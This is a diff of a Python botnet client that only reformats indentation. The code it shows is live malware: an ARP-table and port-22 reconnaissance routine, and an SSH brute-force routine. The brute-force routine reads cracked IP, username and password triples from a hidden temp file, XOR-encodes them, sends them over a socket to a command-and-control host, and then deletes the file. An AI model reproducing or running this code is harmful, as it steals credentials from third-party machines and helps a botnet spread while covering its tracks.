@@ -74,12 +74,12 @@ def arp_table_snoop():#sends arp table form bots' host's arp table
 						s.close()
 				try:
 					if port_22_fb_enc != '':
-                                                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                                                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
-                                                s.settimeout(1)
-                                                s.connect((str(cnc),int(fb_port)))
-                                                s.send(port_22_fb_enc)
-                                                s.close()
+						s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+						s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
+						s.settimeout(1)
+						s.connect((str(cnc),int(fb_port)))
+						s.send(port_22_fb_enc)
+						s.close()
 				except:
 					pass
 
@@ -103,10 +103,10 @@ def brute_force_ssh(ip,username,t_out):#brute force attack on port 22
 			with open('/tmp/.bfssh_results', 'r') as file:
 				for line in file:
 					bf_results = ''
-                                        bf_results_clean = ''
-                                        bf_results_enc = ''
-                                        line_parse = []
-                                        line_parse = line.split(" ")
+					bf_results_clean = ''
+					bf_results_enc = ''
+					line_parse = []
+					line_parse = line.split(" ")
 					if len(line_parse) >= 10:
 						if line_parse[9] == "password:":
 							bf_results = "$$$ ip_addr: "+line_parse[2]+' tcp_port: 22, username: '+line_parse[6]+', password: '+line_parse[10] 
@@ -114,12 +114,12 @@ def brute_force_ssh(ip,username,t_out):#brute force attack on port 22
 							bf_results_enc = (xor_enc(bf_results_clean,key).encode())#encoding message to send back to cnc
 							try:
 								if bf_results_enc != '':
-                                                                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                                                                        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
-                                                                        s.settimeout(1)
-                                                                        s.connect((str(cnc),int(fb_port)))
-                                                                        s.send(bf_results_enc)
-                                                                        s.close()
+									s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+									s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
+									s.settimeout(1)
+									s.connect((str(cnc),int(fb_port)))
+									s.send(bf_results_enc)
+									s.close()
 							except:
 								pass
 			subprocess.run(['rm', '-rf','/tmp/.bfssh_results'])
